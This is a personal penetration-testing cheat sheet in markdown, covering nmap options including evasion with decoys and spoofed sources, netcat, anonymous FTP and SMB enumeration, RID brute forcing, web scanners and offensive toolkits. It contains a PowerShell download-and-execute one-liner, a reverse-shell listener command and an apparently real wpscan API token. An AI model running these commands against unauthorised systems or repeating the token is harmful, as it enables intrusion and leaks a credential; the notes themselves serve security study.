# Pen Test notes

## Initial Enum
### Useful Nmap Switches
- `-A` - Aggressive, does default scripts and traceroute
- `--packet-trace` - shows all packets sent and recieved
- `--reason` - shows the reason for certain results like the host is up determination
- `-Pn` - disable echo for host up
- `-F` - only do top 100 ports 
- `--stats-every=5s` - shows scan progression
- `-vv` - increase verbosity
- `--script <option>` - Uses NSE Group
  - `auth` -	Determination of authentication credentials.
  - `broadcast` -	Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
  - `brute` -	Executes scripts that try to log in to the respective service by brute-forcing with credentials.
  - `default` -	Default scripts executed by using the -sC option.
  - `discovery` -	Evaluation of accessible services.
  - `dos` -	These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
  - `exploit` -	This category of scripts tries to exploit known vulnerabilities for the scanned port.
  - `external` -	Scripts that use external services for further processing.
  - `fuzzer` -	This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
  - `intrusive` -	Intrusive scripts that could negatively affect the target system.
  - `malware` -	Checks if some malware infects the target system.
  - `safe` -	Defensive scripts that do not perform intrusive and destructive access.
  - `version` -	Extension for service detection.
  - `vuln` -	Identification of specific vulnerabilities.  \

Nmap scripts are an important part of enumeration, so its a good idea to keep them updated using `sudo nmap --script-updatedb`, you can also search available individual nmap scripts based on your needs, an example to look for smb scripts would look like:  `find /usr/share/nmap/scripts -type f -name smb* | grep scripts`
#### Nmap Performance
Nmap can be tuned to be faster or slower to work with your network. It is importnant to understand what these flags do to know how they can help
- **RTT** - Round trip time is important because it is the ammount of time your scan will take on a single scan before assuming that there will be no response, if you set this too low you could miss hosts, but if its too high you risk wasting time, If time is on your side i would leave these as default.
  - `--initial-rtt-timeout <TIME>ms` -	Sets the specified time value as initial RTT(round trip time) timeout.
  - `--max-rtt-timeout <TIME>ms` -	Sets the specified time value as maximum RTT timeout.
- **Retries** - TCP is a conection oriented protocol and is built with the ability to retry a connection if no response is recieved, you may not want this for your purposes so you can tailor this behavior
  - `--max-retries 0` - Tells nmap not to retry failed connections
- **Rates** - Nmap also has an option to speed up scans in the form of rates, rates dictate how many packets to send at a time while timing dictates
  - `--min-rate 1000` - specifies the number of packets to send per secons
- **Timing** - These can all be a bit confusing so nmap has created timing modes that have these fields and many others set for your specific needs, they are:
  - `-T 0` / `-T paranoid`
  - `-T 1` / `-T sneaky`
  - `-T 2` / `-T polite`
  - `-T 3` / `-T normal`
  - `-T 4` / `-T aggressive`
  - `-T 5` / `-T insane`

#### Nmap Evasion
While this is not likely in a lab, you may run into a situation in a pentest in which you have to evade detection, nmap has a few switches to assist with this
- `-D RND:5`	- Generates five random IP addresses that indicates the source IP the connection comes from.
- `-S 1.1.1.1` -	Scans the target by using different source IP address (in this case 1.1.1.1).
- `-e eth0`	- Sends all requests through the specified interface.
- `--source-port 53` - Use a different Source port for scans
- `--dns-server <ns>,<ns>` - Use a different DNS server for reverse lookups
 
Heres a simple nmap script to do some host enumeration
```
#/bin/bash
read -p "Enter an IP here: " USER_IP
OPEN_PORTS=`nmap -p- --min-rate=1000 -T4 $USER_IP | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//`
nmap -p$OPEN_PORTS -sC -sV $USER_IP

```
- nmap scripts stored in ```/usr/share/nmap/scripts```
- search internal exploit db using ```searchsploit <SEARCHTERM>```
- mirror exploit to current directory using ```searchsploit -m <EXPLOIT_ID>```
### Netcat
Netcat is another useful tool for enumerating devices and connecting to applications. Netcat can be used as a simple scanner or a full on client deending on the application. 
#### Scanning
```
nc -nvz 1.1.1.1 53 #Scan server for dns port
```
- `-n` - disable reverse DNS
- `-v` - Increase Verbosity
- `-z` - Zero I/O mode, will only attempt the connection then disco
#### Connecting
```
nc -nv 1.1.1.1 23 #Connect to server via telnet
```

### OpenSSL
OpenSSL can also be used as a client to connect to different applications that nc wont work for due to being enabled
```
openssl s_client -connect 1.1.1.1:21 -starttls ftp
```


## Application Specific Enum
### FTP
Unfortunately, many FTP servers are still set up with anonymous logns enabled, to connect to a server anonymously use:
```
tnftp "ftp://anonymous:anonymous@1.1.1.1"
```
Once Connected, theres a bunch of commands that you can use to enumerate a share
- `status` - shows basic info about your connection to the FTP server 
- `debug` - makes output more verbose 
- `trace` - traces commands sent to/from the server
- `ls -R` - performs a recursive listing 
- `get <FILE>` - download a file from the server 

You can also use web technologies to connect to ftp servers, which means you can use things like `wget` to download files
- `wget -m --no-passive ftp://anonymous:anonymous@1.1.1.1` - Download all files from the ftp server

### SMB
- `smbclient -N -L //1.1.1.1`  Connecting to a smb share anonymously and listing drives
- `smbclient -U username%password //1.1.1.1/share` connect to a smbshare named "share" using "username/password"
- `rpcclient -U "username%password" 1.1.1.1`  
  - `srvinfo` 	Server information.
  - `enumdomains` 	Enumerate all domains that are deployed in the network.
  - `querydominfo` 	Provides domain, server, and user information of deployed domains.
  - `netshareenumall` 	Enumerates all available shares.
  - `netsharegetinfo` \<share\> 	Provides information about a specific share.
  - `enumdomusers` 	Enumerates all domain users.
  - `queryuser` \<RID\> 	Provides information about a specific user.

Brute forcing RIDs; This script will cycle through the RIDs for local accoints on a windows host.

`for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done`

## Web
- its always safe to run a ```dirb <URL>``` to get an idea of publicly accesible URLs
  - While youre doing this since davtest doesnt support proxy you gotta edit some settings in burp id you want to view the traffic.
    - go to Options >Proxy Listeners
    - In the Bindings tab change the port to 80, and the interfact to your localhost
    - IN the Request Handling, change IP and Port to that of your target
    - Finally redo the davtest on your localhost specified in the binding tab
- another suitable alernative for dirbuster is gobuster you have to make sure to specify wordlists.
  - ```
    gobuster /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <URL> -t 20
    gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
    ```
- Nikto can be used with ```nikto -host <URL>```
- if you wee webdav open, try to ```davtest -url <URL>``` 
- Wordpress sites can be scanned with 
  ```
  wpscan --url <URL> --enumerate --api-token OLQ6ae0X6oaP5TolckVONjsTzsmh5Nz3sVNbj0JCuIY
  ```

  `pip3 install scrapy`


# Exploitation
- Python PTY Shells
  ```
  git clone https://github.com/infodox/python-pty-shells.git
  ```
- Nishang Pentest Tools
  ```
  git clone https://github.com/samratashok/nishang.git
  ```
- Powershell Empire
  ```
  git clone https://github.com/EmpireProject/Empire.git
  ```
- When trying blind remote code execution on a box the easiest way to tell if it work is by pinging yourself so on yout local box set up a pcap```tcmpdump -i <INTERFACE_NAME>```
- Remember when you FTP data, if you want to send any special media like executables specify ```binary```


## Windows
- When on target powershell enumeration can be done by using the sherlock script
  ```
  git clone https://github.com/rasta-mouse/Sherlock.git
  ```
- When using shells found in the Nishang kit make sure your handler is ```nc -lvnp <Port>```
- 64Bt binaries in windows are stored in ```C:\Windows\SysNative```
- Powershell is stored in ```C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe```
- wget and execute with powershell using INVOKE-EXPRESSION ```IEX(New-Object Net.Webclient).downloadString('<URL>')```
